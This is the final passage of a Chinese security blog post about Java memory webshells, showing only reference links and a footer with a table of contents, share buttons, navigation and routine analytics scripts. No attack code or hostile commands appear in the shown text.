<p>参考：<a target="_blank" rel="noopener" href="https://github.com/W01fh4cker/LearnJavaMemshellFromZero?tab=readme-ov-file#42-spring-interceptor%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">https://github.com/W01fh4cker/LearnJavaMemshellFromZero?tab=readme-ov-file#42-spring-interceptor%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC</a></p>
<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12047?time__1311=mqmhBKD50KAIKiqGNDQbiQvQ%3DxIx9%3DC1roD&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F#toc-5">https://xz.aliyun.com/t/12047?time__1311=mqmhBKD50KAIKiqGNDQbiQvQ%3DxIx9%3DC1roD&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F#toc-5</a></p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/categories/">Category</a></li>
        
          <li><a href="/tags/">Tag</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/link/">Friends</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">1.前置基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BC%A0%E7%BB%9F%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.</span> <span class="toc-text">2.传统内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1Filter-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.1.</span> <span class="toc-text">2.1Filter 内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1%E8%AE%BF%E9%97%AEfilter%E4%B9%8B%E5%90%8E%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-number">2.1.1.</span> <span class="toc-text">2.1.1访问filter之后的调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2%E8%AE%BF%E9%97%AEfilter%E4%B9%8B%E5%89%8D%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.1.2访问filter之前的调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-3%E5%85%B3%E4%BA%8EStandardContext%E3%80%81ApplicationContext%E3%80%81ServletContext"><span class="toc-number">2.1.3.</span> <span class="toc-text">2.1.3关于StandardContext、ApplicationContext、ServletContext</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1-3-1%E7%BC%96%E5%86%99demo"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">2.1.3.1编写demo</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2Listener-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.2.</span> <span class="toc-text">2.2Listener 内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-1-%E4%BB%80%E4%B9%88%E6%98%AF-Listener%EF%BC%9F"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1 什么是 Listener？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-2-Listener-%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2 Listener 类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-3%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAdemo%E6%9D%A5%E5%AD%A6%E4%B9%A0"><span class="toc-number">2.2.3.</span> <span class="toc-text">2.2.3编写一个demo来学习</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-4%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">2.2.4.</span> <span class="toc-text">2.2.4调试分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3servlet%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.3.</span> <span class="toc-text">2.3servlet内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-1%E4%BB%80%E4%B9%88%E6%98%AFservlet"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.3.1什么是servlet</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-2%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAdemo"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.3.2编写一个demo</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-3-%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-number">2.3.3.</span> <span class="toc-text">2.3.3 调试过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-4%E5%86%85%E5%AD%98%E9%A9%AC%E7%BC%96%E5%86%99"><span class="toc-number">2.3.4.</span> <span class="toc-text">2.3.4内存马编写</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4valve%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.4.</span> <span class="toc-text">2.4valve内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-4-1-valve%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.4.0.1.</span> <span class="toc-text">2.4.1 valve是什么</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-4-2%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">2.4.0.2.</span> <span class="toc-text">2.4.2调用过程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-4-3demo%E7%BC%96%E5%86%99"><span class="toc-number">2.4.0.3.</span> <span class="toc-text">2.4.3demo编写</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5websocket%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.5.</span> <span class="toc-text">2.5websocket内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-1websocket%E7%AE%80%E4%BB%8B"><span class="toc-number">2.5.1.</span> <span class="toc-text">2.5.1websocket简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-2%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%9E%E7%8E%B0"><span class="toc-number">2.5.2.</span> <span class="toc-text">2.5.2服务端实现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-5-2-1%E6%B3%A8%E8%A7%A3%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0"><span class="toc-number">2.5.2.1.</span> <span class="toc-text">2.5.2.1注解方式实现</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-5-2-2%E7%BB%A7%E6%89%BF%E6%8A%BD%E8%B1%A1%E7%B1%BB"><span class="toc-number">2.5.2.2.</span> <span class="toc-text">2.5.2.2继承抽象类</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tomcat-WebSocket%E7%9A%84%E5%8A%A0%E8%BD%BD"><span class="toc-number">2.5.3.</span> <span class="toc-text">Tomcat WebSocket的加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tomcat-WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="toc-number">2.5.4.</span> <span class="toc-text">Tomcat WebSocket内存马的实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-3%E5%AE%8C%E6%95%B4%E7%9A%84jsp%E6%B3%A8%E5%85%A5"><span class="toc-number">2.5.5.</span> <span class="toc-text">2.5.3完整的jsp注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-6upgrade%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.6.</span> <span class="toc-text">2.6upgrade内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-7executor%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.7.</span> <span class="toc-text">2.7executor内存马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-agent%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">3.</span> <span class="toc-text">3.agent内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-Agent%E7%A4%BA%E4%BE%8B"><span class="toc-number">3.1.</span> <span class="toc-text">Java Agent示例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#premain-Agent"><span class="toc-number">3.1.1.</span> <span class="toc-text">premain-Agent</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#agentmain-Agent"><span class="toc-number">3.1.2.</span> <span class="toc-text">agentmain-Agent</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#VirtualMachine%E7%B1%BB"><span class="toc-number">3.1.2.1.</span> <span class="toc-text">VirtualMachine类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#VirtualMachineDescriptor%E7%B1%BB"><span class="toc-number">3.1.2.2.</span> <span class="toc-text">VirtualMachineDescriptor类</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Instrumentation"><span class="toc-number">3.1.3.</span> <span class="toc-text">Instrumentation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87JVM%E5%B7%B2%E5%8A%A0%E8%BD%BD%E7%B1%BB"><span class="toc-number">3.1.3.1.</span> <span class="toc-text">获取目标JVM已加载类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E7%9B%AE%E6%A0%87JVM%E7%9A%84Class%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-number">3.1.3.2.</span> <span class="toc-text">修改目标JVM的Class字节码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Instrumentation%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7"><span class="toc-number">3.2.</span> <span class="toc-text">Instrumentation的局限性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Agent%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">3.3.</span> <span class="toc-text">Agent内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Spring-Boot%E4%B8%AD%E7%9A%84Tomcat"><span class="toc-number">3.3.1.</span> <span class="toc-text">Spring Boot中的Tomcat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Java-Agent%E5%AE%9E%E7%8E%B0Spring-Filter%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">3.3.2.</span> <span class="toc-text">利用Java Agent实现Spring Filter内存马</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-spring%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">4.</span> <span class="toc-text">4.spring内存马</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/&text=Java内存马"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/&title=Java内存马"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/&is_video=false&description=Java内存马"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Java内存马&body=Check out this article: https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/&title=Java内存马"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/&title=Java内存马"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/&title=Java内存马"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/&title=Java内存马"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/&name=Java内存马&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/&t=Java内存马"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    Oceanzbz
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/link/">Friends</a></li><!--
     -->
      </ul>
      <ul>
        
          <!-- 不蒜子统计 -->
          <span id="busuanzi_container_site_pv">
              本站总访问量<span id="busuanzi_value_site_pv"></span>次
          </span>
          <span class="post-meta-divider">|</span>
          <span id="busuanzi_container_site_uv" style='display:none'>
                  本站访客数<span id="busuanzi_value_site_uv"></span>人
          </span>
          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        
      </ul>
    </nav>
  </div>
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-QWTJSPQL4F');
</script>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'cactus-1';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
